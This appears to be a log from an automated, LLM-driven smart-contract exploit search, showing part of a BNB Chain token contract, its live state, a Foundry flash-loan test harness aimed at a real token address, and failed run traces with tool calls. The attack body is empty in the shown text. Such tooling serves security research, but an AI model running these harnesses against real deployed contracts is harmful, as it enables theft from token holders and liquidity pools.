+    buybackMultiplierTriggeredAt = 0;
+  }
+  // Trigger an autobuyback
+  function triggerAutoBuyback() internal {
+    buyTokens(autoBuybackAmount, DEAD);
+    if (autoBuybackMultiplier) {
+      buybackMultiplierTriggeredAt = block.timestamp;
+      emit BuybackMultiplierActive(buybackMultiplierLength);
+    }
+    autoBuybackBlockLast = block.number;
+    autoBuybackAccumulator = autoBuybackAccumulator.add(autoBuybackAmount);
+    if (autoBuybackAccumulator > autoBuybackCap) {
+      autoBuybackEnabled = false;
+    }
+  }
+  // Buy amount of tokens with bnb from the contract
+  function buyTokens(uint256 amount, address to) internal swapping {
+    address[] memory path = new address[](2);
+    path[0] = WBNB;
+    path[1] = address(this);
+    router.swapExactETHForTokensSupportingFeeOnTransferTokens {
+      value: amount
+    }(0, path, to, block.timestamp);
+  }
+  // Set autobuyback settings
+  function setAutoBuybackSettings(bool _enabled, uint256 _cap, uint256 _amount, uint256 _period, bool _autoBuybackMultiplier) external authorized {
+    autoBuybackEnabled = _enabled;
+    autoBuybackCap = _cap;
+    autoBuybackAccumulator = 0;
+    autoBuybackAmount = _amount;
+    autoBuybackBlockPeriod = _period;
+    autoBuybackBlockLast = block.number;
+    autoBuybackMultiplier = _autoBuybackMultiplier;
+  }
+  // Set buybackmultiplier settings
+  function setBuybackMultiplierSettings(uint256 numerator, uint256 denominator, uint256 length) external authorized {
+    require(numerator / denominator <= 2 && numerator > denominator);
+    buybackMultiplierNumerator = numerator;
+    buybackMultiplierDenominator = denominator;
+    buybackMultiplierLength = length;
+  }
+  // Check when the token is launched
+  function launched() internal view returns(bool) {
+    return launchedAt != 0;
+  }
+  // Set the launchedAt to token launch
+  function launch() internal {
+    launchedAt = block.number;
+  }
+  // Set max buy TX 
+  function setBuyTxLimitInPercent(uint256 maxBuyTxPercent) external authorized {
+    _maxBuyTxAmount = _totalSupply.mul(maxBuyTxPercent).div(10000);
+  }
+  // Set max sell TX 
+  function setSellTxLimitInPercent(uint256 maxSellTxPercent) external authorized {
+    _maxSellTxAmount = _totalSupply.mul(maxSellTxPercent).div(10000);
+  }
+  // Exempt from dividend
+  function setIsDividendExempt(address holder, bool exempt) external authorized {
+    require(holder != address(this) && holder != pair);
+    isDividendExempt[holder] = exempt;
+    if (exempt) {
+      distributor.setShare(holder, 0);
+    } else {
+      distributor.setShare(holder, _balances[holder]);
+    }
+  }
+  // Exempt from fee
+  function setIsFeeExempt(address holder, bool exempt) external authorized {
+    isFeeExempt[holder] = exempt;
+  }
+  // Exempt from max TX
+  function setIsTxLimitExempt(address holder, bool exempt) external authorized {
+    isTxLimitExempt[holder] = exempt;
+  }
+  // Exempt from buy CD
+  function setIsTimelockExempt(address holder, bool exempt) external authorized {
+    isTimelockExempt[holder] = exempt;
+  }
+  // Set our buy fees
+  function setBuyFees(uint256 _stakingFee, uint256 _feeDenominator) external authorized {
+    stakingFeeBuy = _stakingFee;
+    feeDenominator = _feeDenominator;
+  }
+  // Set our sell fees
+  function setSellFees(uint256 _liquidityFeeSell, uint256 _buybackFeeSell, uint256 _charityFeeSell, uint256 _marketingFeeSell, uint256 _devFeeSell, uint256 _feeDenominator) external authorized {
+    liquidityFeeSell = _liquidityFeeSell;
+    buybackFeeSell = _buybackFeeSell;
+    charityFeeSell = _charityFeeSell;
+    marketingFeeSell = _marketingFeeSell;
+    devFeeSell = _devFeeSell;
+    totalFeeSell = _liquidityFeeSell.add(_buybackFeeSell).add(_charityFeeSell).add(_marketingFeeSell).add(_devFeeSell);
+    feeDenominator = _feeDenominator;
+  }
+  // Set the marketing and liquidity receivers
+  function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _buyBackFeeReceiver, address _developmentFeeReceiver, address _charityFeeReceiver, address _stakingFeeReceiver) external authorized {
+    autoLiquidityReceiver = _autoLiquidityReceiver;
+    marketingFeeReceiver = _marketingFeeReceiver;
+    buyBackFeeReceiver = _buyBackFeeReceiver;
+    developmentFeeReceiver = _developmentFeeReceiver;
+    charityFeeReceiver = _charityFeeReceiver;
+    stakingFeeReceiver = _stakingFeeReceiver;
+  }
+  // Set swapBack settings
+  function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
+    swapEnabled = _enabled;
+    swapThreshold = _totalSupply * _amount / 10000;
+  }
+  // Set target liquidity
+  function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
+    targetLiquidity = _target;
+    targetLiquidityDenominator = _denominator;
+  }
+  // Send BNB to marketingwallet
+  function manualSend() external authorized {
+    uint256 contractETHBalance = address(this).balance;
+    payable(marketingFeeReceiver).transfer(contractETHBalance);
+  }
+  // Set criteria for auto distribution
+  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
+    distributor.setDistributionCriteria(_minPeriod, _minDistribution);
+  }
+  // Let people claim there dividend
+  function claimDividend() external {
+    distributor.claimDividend(msg.sender);
+  }
+  // Check how much earnings are unpaid
+  function getUnpaidEarnings(address shareholder) public view returns(uint256) {
+    return distributor.getUnpaidEarnings(shareholder);
+  }
+  // Set gas for distributor
+  function setDistributorSettings(uint256 gas) external authorized {
+    require(gas < 750000);
+    distributorGas = gas;
+  }
+  // Get the circulatingSupply
+  function getCirculatingSupply() public view returns(uint256) {
+    return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
+  }
+  // Get the liquidity backing
+  function getLiquidityBacking(uint256 accuracy) public view returns(uint256) {
+    return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
+  }
+  // Get if we are over liquified or not
+  function isOverLiquified(uint256 target, uint256 accuracy) public view returns(bool) {
+    return getLiquidityBacking(accuracy) > target;
+  }
+  event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
+  event BuybackMultiplierActive(uint256 duration);
+}
+```
+
+The contract has a number of public/private variables, these are their current values:
+owner = 0x5Cf2FaD657cfD67AbF2843fae1CAb56DD31B2399
+BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
+WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+DEAD = 0x000000000000000000000000000000000000dEaD
+ZERO = 0x0000000000000000000000000000000000000000
+autoLiquidityReceiver = 0xe1e7703841b16d61c23Fdf61d5F5Be6a88c293BB
+marketingFeeReceiver = 0x79F168512BFC75709cE3919ECcd51DEC48f62502
+buyBackFeeReceiver = 0x7B607249675C40733E13db4221386822f94B46aa
+developmentFeeReceiver = 0x0BdFc49D8F691f0d993d013e74F83405b77387b4
+charityFeeReceiver = 0xeeC03165D878e6634A1Fa2e242760d4fB5711849
+stakingFeeReceiver = 0x8B543639C657ADf1a5e2F4D839a9F680107faeA6
+_totalSupply = 1000000000000000000000
+_maxBuyTxAmount = 30000000000000000000
+_maxSellTxAmount = 15000000000000000000
+_maxWalletToken = 30000000000000000000
+stakingFeeBuy = 10
+liquidityFeeSell = 3
+buybackFeeSell = 2
+charityFeeSell = 2
+marketingFeeSell = 5
+devFeeSell = 2
+totalFeeSell = 14
+liquidityFee = 0
+buybackFee = 0
+charityFee = 0
+marketingFee = 0
+devFee = 0
+totalFee = 0
+stakingFee = 10
+feeDenominator = 100
+GREEDTriggeredAt = 0
+GREEDDuration = 3600
+deadBlocks = 3
+swapThreshold = 15000000000000000000
+targetLiquidity = 20
+targetLiquidityDenominator = 100
+buybackMultiplierNumerator = 200
+buybackMultiplierDenominator = 100
+buybackMultiplierTriggeredAt = 0
+buybackMultiplierLength = 1800
+autoBuybackEnabled = False
+autoBuybackMultiplier = True
+autoBuybackCap = 0
+autoBuybackAccumulator = 0
+autoBuybackAmount = 0
+autoBuybackBlockPeriod = 0
+autoBuybackBlockLast = 0
+distributor = 0xeba5d7b5ba5a9b95d714074955d714d135f23fa7
+distributorGas = 500000
+buyCooldownEnabled = True
+cooldownTimerInterval = 4
+router = 0x10ed43c718714eb63d5aa57b78b54704e256024e
+pair = 0xAA692616034201a3131314197CF9F1e47469E52F
+launchedAt = 15937068
+tradingOpen = True
+swapEnabled = True
+inSwap = False
+
+
+If these addresses above are relevant for the exploit, you must ask for their source code and understand how they work.
+
+# Test code to execute the exploit
+
+```
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+import "forge-std/Test.sol";
+
+interface IWETH {
+    function deposit() external payable;
+    function transfer(address to, uint256 value) external returns (bool);
+    function approve(address guy, uint256 wad) external returns (bool);
+    function withdraw(uint256 wad) external;
+    function balanceOf(address) external view returns (uint256);
+}
+
+interface IERC20 {
+    function approve(address guy, uint256 wad) external returns (bool);
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+}
+
+interface IUniswapV2Factory {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2Pair {
+  function decimals() external pure returns (uint8);
+  function totalSupply() external view returns (uint);
+  function balanceOf(address owner) external view returns (uint);
+  function allowance(address owner, address spender) external view returns (uint);
+
+  function approve(address spender, uint value) external returns (bool);
+  function transfer(address to, uint value) external returns (bool);
+  function transferFrom(address from, address to, uint value) external returns (bool);
+
+  function MINIMUM_LIQUIDITY() external pure returns (uint);
+  function factory() external view returns (address);
+  function token0() external view returns (address);
+  function token1() external view returns (address);
+  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+  function price0CumulativeLast() external view returns (uint);
+  function price1CumulativeLast() external view returns (uint);
+  function kLast() external view returns (uint);
+
+  function mint(address to) external returns (uint liquidity);
+  function burn(address to) external returns (uint amount0, uint amount1);
+  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+  function skim(address to) external;
+  function sync() external;
+}
+
+interface IUniswapV2Router {
+    function factory() external view returns (address);
+    function WETH() external pure returns (address);
+
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable;
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amountADesired,
+        uint amountBDesired,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB, uint liquidity);
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+    function removeLiquidity(
+        address tokenA,
+        address tokenB,
+        uint liquidity,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB);
+    function removeLiquidityETH(
+        address token,
+        uint liquidity,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountToken, uint amountETH);
+}
+
+interface IBalancerVault {
+    function flashLoan(
+        address recipient,
+        address[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IDODO {
+    function flashLoan(
+        uint256 loanAmount,
+        uint256 feeAmount,
+        address receiver,
+        bytes calldata data
+    ) external;
+}
+
+interface IOukaInu {
+    function autoLiquidityReceiver() external returns (address);
+    function marketingFeeReceiver() external returns (address);
+    function buyBackFeeReceiver() external returns (address);
+    function developmentFeeReceiver() external returns (address);
+    function charityFeeReceiver() external returns (address);
+    function stakingFeeReceiver() external returns (address);
+    function _maxBuyTxAmount() external returns (uint256);
+    function _maxSellTxAmount() external returns (uint256);
+    function _maxWalletToken() external returns (uint256);
+    function isBlacklisted(address) external returns (bool);
+    function swapThreshold() external returns (uint256);
+    function autoBuybackEnabled() external returns (bool);
+    function autoBuybackMultiplier() external returns (bool);
+    function buyCooldownEnabled() external returns (bool);
+    function cooldownTimerInterval() external returns (uint8);
+    function router() external returns (address);
+    function pair() external returns (address);
+    function launchedAt() external returns (uint256);
+    function tradingOpen() external returns (bool);
+    function swapEnabled() external returns (bool);
+    function authorize(address) external;
+    function unauthorize(address) external;
+    function isOwner(address) external view returns (bool);
+    function isAuthorized(address) external view returns (bool);
+    function transferOwnership(address) external;
+    function totalSupply() external view returns (uint256);
+    function decimals() external pure returns (uint8);
+    function symbol() external pure returns (string memory);
+    function name() external pure returns (string memory);
+    function getOwner() external view returns (address);
+    function balanceOf(address) external view returns (uint256);
+    function allowance(address,address) external view returns (uint256);
+    function approve(address,uint256) external returns (bool);
+    function approveMax(address) external returns (bool);
+    function transfer(address,uint256) external returns (bool);
+    function transferFrom(address,address,uint256) external returns (bool);
+    function setMaxWalletPercent(uint256) external;
+    function clearStuckBalance(uint256) external;
+    function getTotalFee(bool) external view returns (uint256);
+    function getMultipliedFee() external view returns (uint256);
+    function tradingStatus(bool) external;
+    function cooldownEnabled(bool,uint8) external;
+    function blacklistAddress(address,bool) external;
+    function triggerManualBuyback(uint256,bool) external;
+    function clearBuybackMultiplier() external;
+    function setAutoBuybackSettings(bool,uint256,uint256,uint256,bool) external;
+    function setBuybackMultiplierSettings(uint256,uint256,uint256) external;
+    function setBuyTxLimitInPercent(uint256) external;
+    function setSellTxLimitInPercent(uint256) external;
+    function setIsDividendExempt(address,bool) external;
+    function setIsFeeExempt(address,bool) external;
+    function setIsTxLimitExempt(address,bool) external;
+    function setIsTimelockExempt(address,bool) external;
+    function setBuyFees(uint256,uint256) external;
+    function setSellFees(uint256,uint256,uint256,uint256,uint256,uint256) external;
+    function setFeeReceivers(address,address,address,address,address,address) external;
+    function setSwapBackSettings(bool,uint256) external;
+    function setTargetLiquidity(uint256,uint256) external;
+    function manualSend() external;
+    function setDistributionCriteria(uint256,uint256) external;
+    function claimDividend() external;
+    function getUnpaidEarnings(address) external view returns (uint256);
+    function setDistributorSettings(uint256) external;
+    function getCirculatingSupply() external view returns (uint256);
+    function getLiquidityBacking(uint256) external view returns (uint256);
+    function isOverLiquified(uint256,uint256) external view returns (bool);
+}
+
+
+
+
+
+contract TestFlaw is Test {
+    address internal target;
+    address internal token0;
+    address internal token1;
+    address internal token;
+    IUniswapV2Router internal uniswapRouter;
+    IUniswapV2Pair internal uniswapPair;
+    IERC20 private valuableToken;
+    address private flashloanProvider;
+
+    function setUniswapPair(address addr) public {
+        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
+        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));
+
+        if (address(uniswapPair) == address(0)) {
+            console.log("Uniswap pair not found.");
+            return;
+        }
+
+        token0 = uniswapPair.token0();
+        token1 = uniswapPair.token1();
+
+        valuableToken.approve(address(uniswapRouter), type(uint256).max);
+        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);
+
+        uint112 reserve0;
+        uint112 reserve1;
+        (reserve0, reserve1, ) = uniswapPair.getReserves();
+        console.log("Uniswap reserves for %s:", addr);
+        console.log("%d for %s", reserve0, token0);
+        console.log("%d for %s", reserve1, token1);
+    }
+
+    function setUp() public {
+
+        target = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
+        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
+        token = 0x4A33D3ea4B30228C363222746939562FbAba2f01;
+
+        // Remove any previous valuableToken/ETH from the balance
+        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
+        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
+        payable(address(0xdead)).transfer(address(this).balance);
+
+        // Handle approvals
+        valuableToken.approve(target, type(uint256).max);
+        //if (token != address(0))
+        //    IERC20(token).approve(target, type(uint256).max);
+        setUniswapPair(token);
+    }
+
+    function testFlaw() external {
+         // flashloan valuableToken from Balancer
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(valuableToken);
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;
+
+        console.log("%s available for the flashloan of valuableToken", amounts[0]);
+
+        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
+        console.log("Initial balance %s", finalValuableBalance);
+        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
+        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
+    }
+
+    // Used by Balancer
+    function receiveFlashLoan(
+        IERC20[] memory,
+        uint256[] memory amounts,
+        uint256[] memory,
+        bytes memory
+    ) external {
+        flashLoanInternal(amounts[0]);
+    }
+
+    // Used by DODO
+    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
+        flashLoanInternal(amount);
+    }
+
+    function flashLoanInternal(uint256 amount) internal {
+        executeExploit(amount);
+
+        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
+        if (amount >= currentValuableBalance) {
+            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
+            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
+            revert("Not enough valuableToken balance to produce profit");
+        }
+        valuableToken.transfer(flashloanProvider, amount);
+        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
+        console.log("Surplus: %s", surplusInValuable);
+        assert(surplusInValuable > 0);
+    }
+
+    function executeExploit(uint256 amount) internal {}
+}
+```
+
+And the first Foundry trace is this one:
+```
+
+Compiling 20 files with Solc 0.8.20
+Solc 0.8.20 finished in 1.93s
+Compiler run successful!
+2026-03-11T10:56:04.094501Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/bsc/85956296"
+
+Ran 1 test for test/Test.t.sol:TestFlaw
+[FAIL: Not enough valuableToken balance to produce profit] testFlaw() (gas: 63060)
+Logs:
+  Uniswap reserves for 0x4A33D3ea4B30228C363222746939562FbAba2f01:
+  0 for 0x4A33D3ea4B30228C363222746939562FbAba2f01
+  0 for 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+  262318851386122044250 available for the flashloan of valuableToken
+  Initial balance 0
+  Current valuable balance: 262318851386122044250
+  Current profit: 0
+
+2026-03-11T10:56:13.909543Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:13.910216Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:13.910284Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:13.917734Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000000000000000000000dead)
+2026-03-11T10:56:15.261609Z  WARN traces::etherscan: could not get etherscan info: ErrorResponse { status: "0", message: "NOTOK", result: Some("Max calls per sec rate limit reached (3/sec)") }
+2026-03-11T10:56:15.286779Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:15.286928Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:15.288694Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:56:15.288797Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+Traces:
+  [63060] TestFlaw::testFlaw()
+    ├─ [2534] WBNB::balanceOf(DPP: [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]) [staticcall]
+    │   └─ ← [Return] 276125106722233730790 [2.761e20]
+    ├─ [0] console::log("%s available for the flashloan of valuableToken", 262318851386122044250 [2.623e20]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2534] WBNB::balanceOf(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Initial balance %s", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [42815] DPP::flashLoan(262318851386122044250 [2.623e20], 0, TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830)
+    │   ├─ [40102] DPP::flashLoan(262318851386122044250 [2.623e20], 0, TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830) [delegatecall]
+    │   │   ├─ [25962] WBNB::transfer(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 262318851386122044250 [2.623e20])
+    │   │   │   ├─ emit Transfer(from: DPP: [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476], to: TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 262318851386122044250 [2.623e20])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4192] TestFlaw::DPPFlashLoanCall(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 262318851386122044250 [2.623e20], 0, 0x307830)
+    │   │   │   ├─ [534] WBNB::balanceOf(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 262318851386122044250 [2.623e20]
+    │   │   │   ├─ [534] WBNB::balanceOf(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 262318851386122044250 [2.623e20]
+    │   │   │   ├─ [0] console::log("Current valuable balance: %s", 262318851386122044250 [2.623e20]) [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] console::log("Current profit: %s", 0) [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Revert] Not enough valuableToken balance to produce profit
+    │   │   └─ ← [Revert] Not enough valuableToken balance to produce profit
+    │   └─ ← [Revert] Not enough valuableToken balance to produce profit
+    └─ ← [Revert] Not enough valuableToken balance to produce profit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 9.81s (1.51s CPU time)
+
+Ran 1 test suite in 12.73s (9.81s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Test.t.sol:TestFlaw
+[FAIL: Not enough valuableToken balance to produce profit] testFlaw() (gas: 63060)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+```
+2026-03-11 18:56:15,514 [INFO] Quimera: Main task status: Waiting response from LLM 🧠 (1/1)
+2026-03-11 18:56:24,424 [INFO] Quimera: Tool requests: [ToolCall(name='fetch_contract_source_code', arguments={'address': '0x4A33D3ea4B30228C363222746939562FbAba2f01'}, tool_call_id='call_TOx5ddeEsDE5hVA7mVfmuRff'), ToolCall(name='fetch_contract_source_code', arguments={'address': '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'}, tool_call_id='call_sUyXFcHhNI53l6ZXOZgr29tQ'), ToolCall(name='fetch_contract_source_code', arguments={'address': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c'}, tool_call_id='call_EY5irtKvvY1lclszIjdrBcA8'), ToolCall(name='fetch_contract_source_code', arguments={'address': '0x10ED43C718714eb63D5aA57B78B54704E256024E'}, tool_call_id='call_62rNtPvqUnKlWpG0M47slt6L'), ToolCall(name='fetch_contract_source_code', arguments={'address': '0x6b1cF1238A924CFA66A6EBE1A12153E7228C8B30'}, tool_call_id='call_A0hQMGUN2rgh7WLYoJts1oEJ')]
+2026-03-11 18:56:24,424 [INFO] Quimera: Executing get_contract_info_as_text for address 0x4A33D3ea4B30228C363222746939562FbAba2f01
+2026-03-11 18:56:24,424 [INFO] Quimera: Using cached contract info.
+2026-03-11 18:56:24,424 [INFO] Quimera: Executing get_contract_info_as_text for address 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56
+2026-03-11 18:56:27,921 [INFO] Quimera: <slither.slither.Slither object at 0x1127c79d0>
+2026-03-11 18:56:27,921 [INFO] Quimera: Contracts found: ['IBEP20', 'Context', 'SafeMath', 'Ownable', 'BEP20Token'], selected BEP20Token
+2026-03-11 18:56:27,931 [INFO] Quimera: {'BEP20Token'}
+2026-03-11 18:56:27,931 [INFO] Quimera: {'_totalSupply', '_decimals'}
+2026-03-11 18:56:28,504 [INFO] Quimera: Contract info text generated successfully.
+2026-03-11 18:56:28,504 [INFO] Quimera: Executing get_contract_info_as_text for address 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+2026-03-11 18:56:31,610 [INFO] Quimera: <slither.slither.Slither object at 0x112f847d0>
+2026-03-11 18:56:31,610 [INFO] Quimera: Contracts found: ['WBNB'], selected WBNB
+2026-03-11 18:56:31,615 [INFO] Quimera: {'WBNB'}
+2026-03-11 18:56:31,615 [INFO] Quimera: {'decimals'}
+2026-03-11 18:56:31,898 [INFO] Quimera: Contract info text generated successfully.
+2026-03-11 18:56:31,898 [INFO] Quimera: Executing get_contract_info_as_text for address 0x10ED43C718714eb63D5aA57B78B54704E256024E
+2026-03-11 18:56:36,057 [INFO] Quimera: <slither.slither.Slither object at 0x112f860d0>
+2026-03-11 18:56:36,057 [INFO] Quimera: Contracts found: ['TransferHelper', 'IPancakeRouter01', 'IPancakeRouter02', 'IPancakeFactory', 'SafeMath', 'IPancakePair', 'PancakeLibrary', 'IERC20', 'IWETH', 'PancakeRouter'], selected PancakeRouter
+2026-03-11 18:56:36,085 [INFO] Quimera: {'PancakeRouter'}
+2026-03-11 18:56:36,085 [INFO] Quimera: {'factory', 'WETH'}
+2026-03-11 18:56:36,085 [INFO] Quimera: Contract info text generated successfully.
+2026-03-11 18:56:36,086 [INFO] Quimera: Executing get_contract_info_as_text for address 0x6b1cF1238A924CFA66A6EBE1A12153E7228C8B30
+2026-03-11 18:56:40,326 [ERROR] Quimera: Error fetching source code for 0x6B1cf1238A924Cfa66A6ebe1a12153E7228c8b30 at block 85956296
+2026-03-11 18:56:54,319 [INFO] Quimera: Tool requests: []
+2026-03-11 18:56:55,324 [INFO] Quimera: Main task status: Installing and running Foundry 🛠️ (1/1)
+2026-03-11 18:56:55,326 [INFO] Quimera: Installing Forge...
+2026-03-11 18:56:57,487 [INFO] Quimera: Running Forge test...
+2026-03-11 18:57:05,905 [INFO] Quimera: Blocker: PancakeLibrary: INSUFFICIENT_LIQUIDITY
+2026-03-11 18:57:05,907 [INFO] Quimera: Trace/output: 
+Compiling 20 files with Solc 0.8.20
+Solc 0.8.20 finished in 2.09s
+Compiler run successful!
+
+Ran 1 test for test/Test.t.sol:TestFlaw
+[FAIL: PancakeLibrary: INSUFFICIENT_LIQUIDITY] testFlaw() (gas: 111087)
+Logs:
+  Uniswap reserves for 0x4A33D3ea4B30228C363222746939562FbAba2f01:
+  0 for 0x4A33D3ea4B30228C363222746939562FbAba2f01
+  0 for 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c
+  262318851386122044250 available for the flashloan of valuableToken
+  Initial balance 0
+
+2026-03-11T10:57:05.887384Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:57:05.888361Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:57:05.888496Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:57:05.891859Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000000000000000000000dead)
+2026-03-11T10:57:05.894620Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+2026-03-11T10:57:05.894793Z  WARN traces::etherscan: could not get etherscan info: ContractCodeNotVerified(0x000000000000000000636f6e736f6c652e6c6f67)
+Traces:
+  [111087] TestFlaw::testFlaw()
+    ├─ [2534] WBNB::balanceOf(DPP: [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476]) [staticcall]
+    │   └─ ← [Return] 276125106722233730790 [2.761e20]
+    ├─ [0] console::log("%s available for the flashloan of valuableToken", 262318851386122044250 [2.623e20]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2534] WBNB::balanceOf(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Initial balance %s", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [90845] DPP::flashLoan(262318851386122044250 [2.623e20], 0, TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830)
+    │   ├─ [88132] DPP::flashLoan(262318851386122044250 [2.623e20], 0, TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x307830) [delegatecall]
+    │   │   ├─ [25962] WBNB::transfer(TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 262318851386122044250 [2.623e20])
+    │   │   │   ├─ emit Transfer(from: DPP: [0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476], to: TestFlaw: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 262318851386122044250 [2.623e20])
+    │   │   │   └─ ← [Return] true
